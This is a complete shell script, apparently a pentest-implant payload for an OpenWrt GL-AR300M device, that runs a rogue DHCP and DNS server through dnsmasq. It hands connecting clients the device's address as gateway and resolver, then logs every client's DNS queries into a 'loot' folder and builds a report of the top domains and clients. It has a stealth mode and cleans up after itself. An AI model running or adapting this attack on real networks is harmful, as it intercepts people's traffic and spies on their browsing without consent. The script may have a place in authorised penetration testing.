#!/bin/sh
#
# Title:        payload_rogue_dhcp.sh (Rogue DHCP & DNS Logger)
# Description:  Man-In-The-Middle attack using dnsmasq to log all DNS queries
#               from clients that connect to the rogue DHCP server
#               Ported for OpenWrt / GL-AR300M.
#
# Usage:        ./payload_rogue_dhcp.sh [duration]
#               duration - Optional seconds to run (default: 60)
#

# ****************************************************************************************************
# Configuration Toggles
# ****************************************************************************************************

# Setup toggles
STEALTH_MODE=false
ENABLE_LOGGING=true

# Rogue DHCP & DNS Configuration
INTERFACE="br-arming"           # Interface that serves clients
DHCP_START="172.16.24.100"      # Start of DHCP range
DHCP_END="172.16.24.200"        # End of DHCP range
DHCP_LEASE="12h"                # DHCP lease time
FORWARD_DNS="8.8.8.8"           # Forward DNS server

# Attack toggles
ENABLE_ROGUE_DHCP=true
ENABLE_DNS_LOGGING=true

# Finish toggles
HALT_SYSTEM_WHEN_DONE=false

# Variables
LOOT_DIR_ROOT="/root/loot/rogue-dhcp"
TODAY=$(date +%Y%m%d)
START_TIME=$(date)
RUN_DURATION=${1:-60}           # Default 60 seconds if not specified

# DNSMasq configuration
DNSMASQ_CONF="/tmp/rogue_dnsmasq.conf"
DNSMASQ_LEASES="/tmp/rogue.leases"
DNSMASQ_LOG="/tmp/dnsmasq_rogue.log"
DNS_SPY_LOG="dns_spy.txt"
CLIENT_LOG="clients.txt"

# ****************************************************************************************************
# LED Helper Functions
# ****************************************************************************************************

LED_CTRL() {
    [ "$STEALTH_MODE" = "true" ] && return
    case "$1" in
        SETUP)  echo "default-on" > /sys/class/leds/green:status/trigger 2>/dev/null ;;
        ATTACK) /usr/bin/LED ATTACK 2>/dev/null ;;
        FINISH) /usr/bin/LED SUCCESS 2>/dev/null ;;
        FAIL)   /usr/bin/LED FAIL 2>/dev/null ;;
        OFF)    /usr/bin/LED OFF 2>/dev/null ;;
    esac
}

# ****************************************************************************************************
# Setup Functions
# ****************************************************************************************************

CREATE_LOOT_FOLDER() {
    mkdir -p "$LOOT_DIR_ROOT"
    LAST_COUNT=$(ls "$LOOT_DIR_ROOT" 2>/dev/null | grep '^[0-9]\+-' | awk -F'-' '{print $1}' | sort -n | tail -n 1)
    if [ -z "$LAST_COUNT" ]; then
        SCAN_COUNT=1
    else
        SCAN_COUNT=$((LAST_COUNT + 1))
    fi
    LOOT_DIR="${LOOT_DIR_ROOT}/${SCAN_COUNT}-${TODAY}"
    mkdir -p "$LOOT_DIR"
}

INITIALIZE_LOG_FILE() {
    LOG_FILE="${LOOT_DIR}/rogue-dhcp.log"
    {
        echo "****************************************************************************************************"
        echo "Rogue DHCP & DNS Logger executed at: $START_TIME"
        echo "****************************************************************************************************"
        echo ""
        echo "Free diskspace before actions: $(df -h /overlay | awk 'NR==2 {print $4}')"
        echo "Loot directory created: $LOOT_DIR"
        echo ""
        echo "=== Configuration ==="
        echo "Interface: $INTERFACE"
        echo "DHCP Range: $DHCP_START - $DHCP_END"
        echo "DHCP Lease: $DHCP_LEASE"
        echo "DNS Forward: $FORWARD_DNS"
        echo "DNS Logging: $ENABLE_DNS_LOGGING"
        echo "Run Duration: ${RUN_DURATION} seconds"
    } > "$LOG_FILE"
}

GET_ROUTER_IP() {
    ROUTER_IP=$(ip addr show br-arming 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1 | head -1)
    if [ -z "$ROUTER_IP" ]; then
        ROUTER_IP="172.16.24.1"
    fi
    echo "$ROUTER_IP"
}

STOP_DNSMASQ() {
    /etc/init.d/dnsmasq stop 2>/dev/null
    killall -9 dnsmasq 2>/dev/null
    sleep 1
}

START_DNSMASQ() {
    /etc/init.d/dnsmasq start 2>/dev/null
}

# ****************************************************************************************************
# Attack Functions
# ****************************************************************************************************

START_ROGUE_DHCP_DNS() {
    [ "$ENABLE_ROGUE_DHCP" != "true" ] && return 1
    
    echo "[*] Starting Rogue DHCP & DNS Server on $INTERFACE..." >> "$LOG_FILE"
    echo "[*] Starting Rogue DHCP & DNS Server on $INTERFACE..."
    
    # Stop any existing dnsmasq processes
    STOP_DNSMASQ
    
    # Get network information
    ROUTER_IP=$(GET_ROUTER_IP)
    
    echo "Router IP: $ROUTER_IP" >> "$LOG_FILE"
    echo "Forward DNS: $FORWARD_DNS" >> "$LOG_FILE"
    
    # Create dnsmasq configuration
    cat > $DNSMASQ_CONF << DNSMASQ_EOF
interface=$INTERFACE
dhcp-range=$DHCP_START,$DHCP_END,$DHCP_LEASE
dhcp-option=3,$ROUTER_IP
dhcp-option=6,$ROUTER_IP
server=$FORWARD_DNS
log-queries
log-facility=$DNSMASQ_LOG
dhcp-leasefile=$DNSMASQ_LEASES
no-hosts
no-resolv
DNSMASQ_EOF
    
    # Start rogue dnsmasq
    dnsmasq -C $DNSMASQ_CONF
    
    if [ $? -eq 0 ]; then
        echo "✓ Rogue DHCP & DNS started successfully" >> "$LOG_FILE"
        echo "✓ Rogue DHCP & DNS started successfully!"
        echo "  - Interface: $INTERFACE" >> "$LOG_FILE"
        echo "  - DHCP Range: $DHCP_START - $DHCP_END" >> "$LOG_FILE"
        echo "  - Rogue DNS: $ROUTER_IP" >> "$LOG_FILE"
        echo "  - Forward DNS: $FORWARD_DNS" >> "$LOG_FILE"
        return 0
    else
        echo "✗ Failed to start rogue dnsmasq" >> "$LOG_FILE"
        return 1
    fi
}

MONITOR_DNS_QUERIES() {
    [ "$ENABLE_DNS_LOGGING" != "true" ] && return
    
    echo "[*] Starting DNS query monitoring..." >> "$LOG_FILE"
    echo "[*] Monitoring DNS queries for ${RUN_DURATION} seconds..."
    
    DNS_SPY_FILE="${LOOT_DIR}/${DNS_SPY_LOG}"
    CLIENT_FILE="${LOOT_DIR}/${CLIENT_LOG}"
    
    # Monitor DNS queries in background
    (
        while true; do
            if [ -f "$DNSMASQ_LOG" ]; then
                tail -n 0 -f "$DNSMASQ_LOG" 2>/dev/null | while read line; do
                    if echo "$line" | grep -q "query\["; then
                        DOMAIN=$(echo "$line" | sed -n 's/.*query\[.*\] \([^ ]*\) .*/\1/p')
                        CLIENT=$(echo "$line" | sed -n 's/.*from \([0-9.]*\).*/\1/p')
                        TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')
                        if [ -n "$DOMAIN" ]; then
                            echo "$TIMESTAMP | $CLIENT | $DOMAIN" >> "$DNS_SPY_FILE"
                            echo "[DNS] $CLIENT -> $DOMAIN"
                        fi
                    fi
                done
            fi
            sleep 1
        done
    ) &
    
    MONITOR_PID=$!
    echo $MONITOR_PID > /tmp/dns_monitor.pid
    echo "DNS Monitor started (PID: $MONITOR_PID)" >> "$LOG_FILE"
}

GENERATE_REPORT() {
    DNS_SPY_FILE="${LOOT_DIR}/${DNS_SPY_LOG}"
    REPORT_FILE="${LOOT_DIR}/report.txt"
    mkdir -p "/root/loot/nmap"
    ln -sf "$REPORT_FILE" "/root/loot/nmap/rogue-report_$(date +%Y%m%d_%H%M%S).txt"
    
    echo "" >> "$LOG_FILE"
    echo "[*] Generating report..." >> "$LOG_FILE"
    echo "[*] Generating report..."
    
    {
        echo "========================================"
        echo "ROGUE DHCP & DNS LOGGER REPORT"
        echo "========================================"
        echo "Scan started: $START_TIME"
        echo "Scan completed: $(date)"
        echo "Loot directory: $LOOT_DIR"
        echo "Interface: $INTERFACE"
        echo "Duration: ${RUN_DURATION} seconds"
        echo ""
        
        if [ -f "$DNS_SPY_FILE" ]; then
            TOTAL_QUERIES=$(wc -l < "$DNS_SPY_FILE" 2>/dev/null)
            UNIQUE_DOMAINS=$(cut -d'|' -f3- "$DNS_SPY_FILE" 2>/dev/null | sort -u | wc -l)
            UNIQUE_CLIENTS=$(cut -d'|' -f2 "$DNS_SPY_FILE" 2>/dev/null | sort -u | wc -l)
            
            echo "=== STATISTICS ==="
            echo "Total DNS queries: $TOTAL_QUERIES"
            echo "Unique domains: $UNIQUE_DOMAINS"
            echo "Unique clients: $UNIQUE_CLIENTS"
            echo ""
            
            echo "=== TOP 10 DOMAINS ==="
            cut -d'|' -f3- "$DNS_SPY_FILE" 2>/dev/null | sort | uniq -c | sort -rn | head -10
            echo ""
            
            echo "=== TOP 10 CLIENTS ==="
            cut -d'|' -f2 "$DNS_SPY_FILE" 2>/dev/null | sort | uniq -c | sort -rn | head -10
            echo ""
            
            echo "=== LAST 20 QUERIES ==="
            tail -20 "$DNS_SPY_FILE"
        else
            echo "No DNS queries captured."
        fi
        echo "========================================"
    } > "$REPORT_FILE"
    
    cat "$REPORT_FILE"
    echo "Report saved to: $REPORT_FILE" >> "$LOG_FILE"
}

CLEANUP() {
    echo "[*] Cleaning up..." >> "$LOG_FILE"
    echo "[*] Cleaning up..."
    
    # Stop monitors
    if [ -f /tmp/dns_monitor.pid ]; then
        kill $(cat /tmp/dns_monitor.pid) 2>/dev/null
        rm -f /tmp/dns_monitor.pid
    fi
    
    # Stop rogue dnsmasq
    killall -9 dnsmasq 2>/dev/null
    
    # Clean temp files
    rm -f $DNSMASQ_CONF
    rm -f $DNSMASQ_LEASES
    rm -f $DNSMASQ_LOG
    
    # Restart legitimate dnsmasq
    START_DNSMASQ
    
    echo "Cleanup completed" >> "$LOG_FILE"
    echo "Cleanup completed."
}

# ****************************************************************************************************
# Execution Flow
# ****************************************************************************************************

LED_CTRL SETUP
CREATE_LOOT_FOLDER
INITIALIZE_LOG_FILE

# Start the rogue DHCP & DNS server
if START_ROGUE_DHCP_DNS; then
    LED_CTRL ATTACK
    
    # Start monitoring
    MONITOR_DNS_QUERIES
    
    # Wait for the specified duration
    sleep $RUN_DURATION
    
    # Generate report
    GENERATE_REPORT
    
    # Cleanup
    CLEANUP
    
    echo "Free diskspace after actions: $(df -h /overlay | awk 'NR==2 {print $4}')" >> "$LOG_FILE"
    echo "Rogue DHCP & DNS Logger completed in $SECONDS seconds" >> "$LOG_FILE"
    echo ""
    echo "✓ Done! Loot saved to: $LOOT_DIR"
    echo "  - DNS Spy: $LOOT_DIR/dns_spy.txt"
    echo "  - Report: $LOOT_DIR/report.txt"
    echo "  - Log: $LOOT_DIR/rogue-dhcp.log"
    
    sync
    LED_CTRL FINISH
else
    CLEANUP
    sync
    LED_CTRL FAIL
fi

if [ "$HALT_SYSTEM_WHEN_DONE" = "true" ]; then poweroff; fi
exit 0

